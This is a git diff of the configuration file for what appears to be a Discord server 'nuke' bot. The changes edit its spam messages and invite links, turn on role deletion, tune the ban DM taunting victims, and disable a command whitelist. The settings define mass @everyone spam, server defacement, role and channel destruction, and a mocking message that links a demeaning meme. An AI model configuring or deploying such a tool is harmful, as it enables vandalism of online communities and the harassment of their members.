@@ -2,7 +2,7 @@ require('dotenv').config();
 
 module.exports = {
     general: {
-        commandPrefix: '!',
+        commandPrefix: '^',
         uptimePort: 3000,
         selfPingInterval: 300000,
         reconnectInterval: 60000,
@@ -10,8 +10,8 @@ module.exports = {
         // NEW: Fake activity (no code changes needed, bots already support presence)
         fakeActivity: {
             enabled: true,
-            name: 'with kyns dihh', // Status text
-            type: 'PLAYING'    // PLAYING, WATCHING, etc.
+            name: 'kyns dihh', // Status text
+            type: 'WATCHING'    // PLAYING, WATCHING, etc.
         }
     },
 
@@ -22,7 +22,7 @@ module.exports = {
         // NEW: Auto-DM banned members (uses existing ban system)
         dmAfterBan: {
             enabled: true,
-            message: "LMAO YOU GOT BANNED BY KYN! Server owned by GoldSociety. https://discord.gg/zxstXnd4"
+            message: "LMAO YOU GOT BANNED BY KYN! Server owned by GoldSociety. https://discord.gg/gnseDAckyh"
         },
         // NEW: Backup nuke (saves server data before nuking)
         backupNuke: {
@@ -30,7 +30,7 @@ module.exports = {
             saveTo: "./backups" // Saves roles/channels/members as JSON
         },
         // NEW: Give @everyone admin (uses existing role system)
-        giveEveryoneAdmin: true,
+        giveEveryoneAdmin: false,
         // NEW: Leave quietly (skips spam if enabled)
         leaveQuietly: false, // No spam, just destruction + exit
         serverIcon: 'https://cdn.discordapp.com/avatars/1284886248330231891/d483984f4119be0f7ad1a7b892bf0d37.png',
@@ -41,9 +41,9 @@ module.exports = {
         ],
         channelCount: 10,
         spammedMessages: [
-            '# @everyone GET NUKED BY KYN! 🐵 https://discord.gg/zxstXnd4',
-            '# @here KYN OWNS YOU ALL NEWGENS! https://tenor.com/view/meme-down-syndrome-funny-tongue-action-tongue-out-meme-gif-572114404054760484',
-            '# @everyone LOL THIS SERVER GOT DESTROYED 😹 https://cdn.discordapp.com/attachments/907080818562854954/1217174300650508448/attachment.gif?ex=68049127&is=68033fa7&hm=aaeea557f62d47bba1de31e232b160ffbdc1a9184ef8d251752959c683744782&'
+            '# @everyone GET NUKED BY KYN! 🐵 https://discord.gg/gnseDAckyh',
+            '# @here KYN OWNS YOU ALL NEWGENS! https://discord.gg/gnseDAckyh',
+            '# @everyone LOL THIS SERVER GOT DESTROYED 😹 https://discord.gg/gnseDAckyh'
         ],
         spamRounds: 100,
         timing: {
@@ -66,13 +66,13 @@ module.exports = {
             createWebhooks: false,
             editServerInfo: true,
             createRoles: false,
-            deleteRoles: false,
+            deleteRoles: true,
             leaveServerAfterNuke: false
         },
         webhooks: {
             createCount: 2,
             names: ["NUKED BY KYN", "GET WRECKED BY GOLDSOCIETY"],
-            messages: ["# NUKEDDDDDDDD JOIN https://discord.gg/zxstXnd4"]
+            messages: ["# NUKEDDDDDDDD JOIN https://discord.gg/gnseDAckyh"]
         },
         roles: {
             createCount: 10,
@@ -95,7 +95,7 @@ module.exports = {
             }
         },
         whitelist: {
-            enabled: true, // Enable or disable the whitelist system
+            enabled: false, // Enable or disable the whitelist system
             commands: ['kynbackup', 'kynrestore'], // Commands restricted by the whitelist
             authorizedUserIds: ['1284886248330231891', '123'] // IDs allowed to use whitelisted commands
         }
